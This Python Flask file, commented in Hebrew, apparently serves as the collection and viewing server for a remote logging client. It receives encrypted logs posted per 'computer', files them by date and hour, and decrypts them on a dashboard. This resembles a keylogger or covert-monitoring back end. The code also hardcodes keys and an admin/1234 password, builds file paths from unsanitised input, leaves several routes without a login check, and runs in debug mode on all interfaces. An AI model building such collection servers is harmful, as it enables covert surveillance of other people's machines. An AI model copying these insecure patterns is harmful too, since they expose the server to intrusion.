from flask import Flask, request, render_template, redirect, url_for, session
import os
import json
from datetime import datetime
from pathlib import Path
from encryptor import Encryptor

app = Flask(__name__)
app.secret_key = "super-secret-key"

BASE_DIR = Path("logs")
os.makedirs(BASE_DIR, exist_ok=True)

# מפתח אחיד לפענוח (אותו מפתח כמו בלקוח!)
ENCRYPTION_KEY = "12345"
decryptor = Encryptor(ENCRYPTION_KEY)

# ---------------- API לקבלת לוגים ----------------
@app.route("/log", methods=["POST"])
def receive_log():
    try:
        data = request.get_json()
        print(data)
        computer = data.get("computer", "UNKNOWN")
        log = data.get("log")
        # print(decryptor.decrypt(log))
        timestamp = datetime.now()
        date_str = timestamp.strftime("%Y-%m-%d")
        hour_str = timestamp.strftime("%H")

        comp_dir = BASE_DIR / computer / date_str
        os.makedirs(comp_dir, exist_ok=True)
        file_path = comp_dir / f"{hour_str}.txt"

        with open(file_path, "a", encoding="utf-8") as f:
            f.write(log + "\n")

        return {"status": "ok"}, 200
    except Exception as e:
        return {"error": str(e)}, 500

# ---------------- מערכת לוגין ----------------
USERS = {"admin": "1234"}

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if USERS.get(username) == password:
            session["user"] = username
            return redirect(url_for("dashboard"))
        return "שם משתמש או סיסמה שגויים"
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.pop("user", None)
    return redirect(url_for("login"))

# ---------------- דשבורד ----------------
@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect(url_for("login"))
    computers = [d.name for d in BASE_DIR.iterdir() if d.is_dir()]
    return render_template("dashboard.html", role=session["user"], computers=computers)

@app.route("/dates/<computer>")
def dates(computer):
    comp_dir = BASE_DIR / computer
    dates = [d.name for d in comp_dir.iterdir() if d.is_dir()]
    return render_template("dates.html", computer=computer, dates=dates)

@app.route("/hours/<computer>/<date>")
def hours(computer, date):
    date_dir = BASE_DIR / computer / date
    hours = [f.stem for f in date_dir.glob("*.txt")]
    return render_template("hours.html", computer=computer, date=date, hours=hours)

@app.route("/view_log/<computer>/<date>/<hour>")
def view_log(computer, date, hour):
    file_path = BASE_DIR / computer / date / f"{hour}.txt"
    logs = []
    with open(file_path, "r", encoding="utf-8") as f:
        for line in f:
            try:
                logs.append(decryptor.decrypt(line.strip()))
            except:
                logs.append(line.strip())
    return render_template("view_log.html", computer=computer, date=date, hour=hour, content=logs)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)

hello